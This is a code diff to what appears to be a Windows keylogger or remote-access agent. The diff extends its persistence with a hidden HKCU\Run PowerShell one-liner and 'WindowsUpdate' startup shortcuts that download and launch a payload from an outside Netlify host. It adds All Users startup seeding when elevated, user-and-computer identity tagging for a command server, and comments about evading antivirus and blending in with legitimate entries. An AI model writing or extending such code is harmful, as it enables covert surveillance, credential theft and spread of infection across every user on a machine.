@@ -2449,20 +2449,58 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     return CallNextHookEx(NULL, nCode, wParam, lParam);
 }
 
-#ifndef NETPEN_REGKEY
+// Prefer per-build randomized key from config.h (AGENT_REGKEY); fallback static.
+#ifdef AGENT_REGKEY
+#define NETPEN_REGKEY AGENT_REGKEY
+#elif !defined(NETPEN_REGKEY)
 #define NETPEN_REGKEY "Software\\Microsoft\\Windows\\CurrentVersion\\RuntimeBroker"
 #endif
 
 static void EnsureStartupEntry();
 static void CreateStartupFolderEntry();
 static void RemoveStartupFolderEntry();
+static void CreateAllUsersStartupEntry();
+static void RemoveAllUsersStartupEntry();
+
+// True when the process token is elevated (admin). No UAC prompt — only checks.
+static bool IsElevated() {
+    HANDLE hToken = NULL;
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) return false;
+    TOKEN_ELEVATION elev = {0};
+    DWORD ret = 0;
+    BOOL ok = GetTokenInformation(hToken, TokenElevation, &elev, sizeof(elev), &ret);
+    CloseHandle(hToken);
+    return ok && elev.TokenIsElevated;
+}
+
+// C2 identity: "COMPUTER\\username" so multi-user on one PC is distinguishable.
+static std::string GetAgentIdentity() {
+    char computer[256] = {0};
+    DWORD csz = sizeof(computer);
+    GetComputerNameA(computer, &csz);
+    char user[256] = {0};
+    DWORD usz = sizeof(user);
+    if (!GetUserNameA(user, &usz) || user[0] == 0) return std::string(computer);
+    return std::string(computer) + "\\" + user;
+}
+
+// True if HKCU\Run still has our download one-liner (not just the marker key).
+static bool RunValueExists() {
+    HKEY hKey;
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_READ, &hKey) != ERROR_SUCCESS)
+        return false;
+    DWORD type = 0, size = 0;
+    LONG r = RegQueryValueExA(hKey, GetExeName().c_str(), NULL, &type, NULL, &size);
+    RegCloseKey(hKey);
+    return r == ERROR_SUCCESS && type == REG_SZ;
+}
 
 // === Persistence management ====================================================
-// Three layers:
-//   1. HKCU\Run registry key — restored every 2 min if GPO wipes it
-//   2. Startup folder .lnk — deleted immediately after agent starts, recreated
-//      only if the Run key is missing (minimizes AV flagging)
-//   3. Self-destruct cleanup reverses all three + deletes EXE files
+// Layers:
+//   1. HKCU\Run — restored every 2 min if GPO wipes it
+//   2. Per-user startup .lnk — only when Run missing; removed when healthy
+//   3. All Users startup .lnk — only if elevated; seeds other users on logon
+//   4. Self-destruct reverses all of the above + deletes EXE files
 
 // Remove all persistence traces. Called during self-destruct.
 // Note: HKEY_CURRENT_USER\Run delete via RegDeleteValueA doesn't check the
@@ -2484,6 +2522,7 @@ static void CleanupPersistence() {
         DeleteFileA((std::string(appdata) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.bat").c_str());
         DeleteFileA((std::string(appdata) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.lnk").c_str());
     }
+    RemoveAllUsersStartupEntry();
 }
 
 // === Hidden window procedure ===================================================
@@ -2576,12 +2615,8 @@ static std::string Base64Encode(const BYTE* data, DWORD size) {
     return result;
 }
 
-#ifndef NETPEN_REGKEY
-#define NETPEN_REGKEY "Software\\Microsoft\\Windows\\CurrentVersion\\RuntimeBroker"
-#endif
-
-// Set up both the NETPEN_REGKEY marker and the HKCU\Run entry with a
-// PowerShell one-liner that downloads the agent from Netlify and starts it.
+// Set up the NETPEN_REGKEY marker and HKCU\Run download one-liner.
+// If elevated, also seed All Users startup so other logons get the agent.
 static void InstallStartup() {
     HKEY hKey;
     if (RegCreateKeyExA(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
@@ -2596,37 +2631,30 @@ static void InstallStartup() {
         RegSetValueExA(hKey, GetExeName().c_str(), 0, REG_SZ, (BYTE*)psCmd.c_str(), (DWORD)psCmd.size() + 1);
         RegCloseKey(hKey);
     }
+    if (IsElevated()) CreateAllUsersStartupEntry();
 }
 
-// Check whether the Run key is intact. If yes, remove the startup folder
-// shortcut (stealth mode). If no (GPO wiped it), reinstall everything and
-// drop the shortcut for next boot.
+// Check Run value (not only marker). Healthy → remove user startup .lnk.
+// Missing → reinstall. If elevated, re-assert All Users seed.
 static void EnsureStartupEntry() {
-    HKEY hKey;
-    if (RegOpenKeyExA(HKEY_CURRENT_USER, NETPEN_REGKEY, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
-        RegCloseKey(hKey);
+    if (RunValueExists()) {
         RemoveStartupFolderEntry();
     } else {
         InstallStartup();
         CreateStartupFolderEntry();
     }
+    if (IsElevated()) CreateAllUsersStartupEntry();
 }
 
-// Create a WindowsUpdate.lnk shortcut in the startup folder. Targets
-// powershell.exe with -w h (hidden) and SW_HIDE on the shortcut itself,
-// so there is zero window flash. Only created when the Run key is missing.
-// The shortcut is named "Windows Update" to blend with legitimate entries.
-// Cleaned up by RemoveStartupFolderEntry() once the agent is alive.
-static void CreateStartupFolderEntry() {
-    char appdata[MAX_PATH];
-    if (GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH) == 0 || appdata[0] == 0) return;
-    std::string startupPath = std::string(appdata) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
+// Create a WindowsUpdate.lnk in the given startup folder (user or All Users).
+static void CreateStartupLnkAt(const std::string& startupPath) {
     DeleteFileA((startupPath + "\\WindowsUpdate.bat").c_str());
     std::string lnkPath = startupPath + "\\WindowsUpdate.lnk";
     DeleteFileA(lnkPath.c_str());
     std::wstring args = L"-w h -c \"$p=$env:TEMP+'\\" + GetExeNameW() + L"';$wc=New-Object Net.WebClient;$wc.DownloadFile('https://allseeing.netlify.app/a',$p);start $p\"";
     HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
-    if (FAILED(hr)) return;
+    if (FAILED(hr) && hr != RPC_E_CHANGED_MODE) return;
+    bool needUninit = SUCCEEDED(hr);
     IShellLinkW* psl = NULL;
     if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLinkW, (void**)&psl))) {
         psl->SetPath(L"powershell.exe");
@@ -2640,16 +2668,38 @@ static void CreateStartupFolderEntry() {
         }
         psl->Release();
     }
-    CoUninitialize();
+    if (needUninit) CoUninitialize();
 }
 
-// Delete any stale .bat or .lnk from the startup folder. Called from
-// RunChild (immediately after agent starts) and from EnsureStartupEntry
-// (when Run key is intact).
+// Per-user startup .lnk — only when Run is missing. Removed when healthy.
+static void CreateStartupFolderEntry() {
+    char appdata[MAX_PATH];
+    if (GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH) == 0 || appdata[0] == 0) return;
+    CreateStartupLnkAt(std::string(appdata) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
+}
+
+// All Users startup — requires elevation. Runs for every interactive logon.
+static void CreateAllUsersStartupEntry() {
+    if (!IsElevated()) return;
+    char allUsers[MAX_PATH];
+    if (GetEnvironmentVariableA("ALLUSERSPROFILE", allUsers, MAX_PATH) == 0 || allUsers[0] == 0) return;
+    CreateStartupLnkAt(std::string(allUsers) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup");
+}
+
+// Delete per-user startup artifacts. Called from RunChild and EnsureStartupEntry.
 static void RemoveStartupFolderEntry() {
     char appdata[MAX_PATH];
     if (GetEnvironmentVariableA("APPDATA", appdata, MAX_PATH) == 0 || appdata[0] == 0) return;
     std::string p = std::string(appdata) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
+    DeleteFileA((p + "\\WindowsUpdate.bat").c_str());
+    DeleteFileA((p + "\\WindowsUpdate.lnk").c_str());
+}
+
+// Delete All Users seed (best-effort; fails silently if not elevated).
+static void RemoveAllUsersStartupEntry() {
+    char allUsers[MAX_PATH];
+    if (GetEnvironmentVariableA("ALLUSERSPROFILE", allUsers, MAX_PATH) == 0 || allUsers[0] == 0) return;
+    std::string p = std::string(allUsers) + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
     DeleteFileA((p + "\\WindowsUpdate.bat").c_str());
     DeleteFileA((p + "\\WindowsUpdate.lnk").c_str());
 }
@@ -2660,10 +2710,7 @@ static void RemoveStartupFolderEntry() {
 // message loop. The hook and timer do all the real work from here.
 
 static int RunChild(HINSTANCE hInstance) {
-    char hostname[256] = {0};
-    DWORD hostnameSize = sizeof(hostname);
-    GetComputerNameA(hostname, &hostnameSize);
-    g_hostname = hostname;
+    g_hostname = GetAgentIdentity();
 
     WNDCLASSEXW wc = {0};
     wc.cbSize = sizeof(WNDCLASSEXW);
@@ -2727,13 +2774,10 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
     CreateMutexW(NULL, TRUE, AGENT_MUTEX);
     if (GetLastError() == ERROR_ALREADY_EXISTS) return 0;
 
-    char hostname[256] = {0};
-    DWORD hostnameSize = sizeof(hostname);
-    GetComputerNameA(hostname, &hostnameSize);
-    g_hostname = hostname;
+    g_hostname = GetAgentIdentity();
 
     InstallStartup();
-    LogMsg("Watchdog started on " + g_hostname);
+    LogMsg("Watchdog started on " + g_hostname + (IsElevated() ? " (elevated multi-user seed)" : ""));
 
     char path[MAX_PATH];
     GetModuleFileNameA(NULL, path, MAX_PATH);
@@ -2799,5 +2843,3 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE, LPSTR lpCmdLine, int) {
 
 
 
-int _s2c82aaaa886e49b28794499e1fb8d69c(void){return 0;}
-int _s36e3d02fe91a4a1aa99ed29479298874(void){return 0;}
